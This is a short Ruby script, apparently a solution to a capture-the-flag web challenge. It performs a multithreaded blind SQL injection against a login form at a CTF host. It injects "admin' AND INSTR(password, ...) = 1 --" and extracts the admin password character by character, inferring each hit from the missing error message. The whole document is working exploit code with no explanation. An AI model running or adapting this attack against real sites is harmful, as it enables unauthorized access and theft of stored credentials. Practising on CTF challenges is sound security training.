gem "ezclient"
gem "parallel"

require "ezclient"
require "parallel"

CHARS = "!".."~"
URL = "http://web2.cadoctf.cloud:1330/"

prefix = "CADO_"
client = EzClient.new

loop do
  size = prefix.size

  Parallel.each(CHARS, in_threads: 20) do |char|
    next if prefix.size > size

    char = "''" if char == "'"
    substring = prefix + char
    login = "admin' AND INSTR(password, '#{substring}') = 1 --"
    resp = client.perform!(:post, URL, params: { login: })

    unless resp.body.include?("Go away dirty hacker")
      prefix << char
      puts prefix
    end
  end

  break if size == prefix.size
end

puts prefix
